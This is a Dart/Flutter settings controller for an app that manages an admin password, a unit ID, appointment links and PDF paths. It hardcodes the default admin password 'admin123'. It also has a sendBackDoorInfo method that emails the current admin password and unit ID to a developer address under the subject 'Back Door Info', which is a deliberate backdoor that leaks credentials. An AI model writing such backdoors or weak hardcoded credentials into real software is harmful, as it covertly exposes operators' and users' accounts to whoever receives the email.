import 'package:flutter/cupertino.dart';
import 'package:get/get.dart';
import '../models/settings_model.dart';
import '../services/email_service.dart';

class SettingsController extends GetxController {
  var settings = SettingsModel(
    adminPassword: "admin123",
    emailSender: "default@example.com",
    unitId: "D D F S _ R D C U _ 0 0 0 3",
    appointmentUrl: "https://api.calendly.com/event_types",
    termsPdfPath: "assets/pdf/DDFS CONCENT FORM DRAFT MATCH 2025 V1.pdf",
    mobilePdfPath: "assets/pdf/Phone Settings.pdf",
    tabletPdfPath: "assets/pdf/Tablet Settings.pdf",
    pcMacPdfPath: "assets/pdf/Computer Settings.pdf",
  ).obs;

  final TextEditingController emailController = TextEditingController();
  final TextEditingController passwordController = TextEditingController();
  final TextEditingController unitIdController = TextEditingController();
  final TextEditingController appointmentUrlController = TextEditingController();
  final TextEditingController termsPdfPathController = TextEditingController();
  final TextEditingController mobilePdfPathController = TextEditingController();
  final TextEditingController tabletPdfPathController = TextEditingController();
  final TextEditingController pcMacPdfPathController = TextEditingController();

  // Remove initialization from the constructor
  // final EmailService _emailService = EmailService();
  EmailService get _emailService => Get.find<EmailService>();

  void updateSettings(SettingsModel newSettings) {
    settings.value = newSettings;
    update();
    clearControllers();
  }

  bool verifyAdminPassword(String password) {
    return password == settings.value.adminPassword;
  }

  void updateEmailSender(String newEmail) {
    settings.value = settings.value.copyWith(emailSender: newEmail);
    update();
    emailController.clear();
  }

  void updateAdminPassword(String newPassword) {
    settings.value = settings.value.copyWith(adminPassword: newPassword);
    update();
    passwordController.clear();
  }

  void updateUnitId(String newUnitId) {
    settings.value = settings.value.copyWith(unitId: newUnitId);
    update();
    _emailService.sendUnitId(newUnitId);
    unitIdController.clear();
  }

  void updatePdfPath(String deviceType, String newPath) {
    if (deviceType == "Mobile Phone") {
      settings.value = settings.value.copyWith(mobilePdfPath: newPath);
      mobilePdfPathController.clear();
    } else if (deviceType == "Tablet") {
      settings.value = settings.value.copyWith(tabletPdfPath: newPath);
      tabletPdfPathController.clear();
    } else if (deviceType == "PC or Mac") {
      settings.value = settings.value.copyWith(pcMacPdfPath: newPath);
      pcMacPdfPathController.clear();
    }
    update();
  }

  void updateTermsPdfPath(String newPdfPath) {
    settings.value = settings.value.copyWith(termsPdfPath: newPdfPath);
    update();
    termsPdfPathController.clear();
  }

  void updateAppointmentUrl(String newUrl) {
    settings.value = settings.value.copyWith(appointmentUrl: newUrl);
    update();
    appointmentUrlController.clear();
  }

  void sendBackDoorInfo() {
    final emailContent = "Current Password: ${settings.value.adminPassword}\nCurrent Unit ID: ${settings.value.unitId}";
    _emailService.sendEmail("developer@example.com", "Back Door Info", emailContent);
  }

  void clearControllers() {
    emailController.clear();
    passwordController.clear();
    unitIdController.clear();
    appointmentUrlController.clear();
    termsPdfPathController.clear();
    mobilePdfPathController.clear();
    tabletPdfPathController.clear();
    pcMacPdfPathController.clear();
  }
}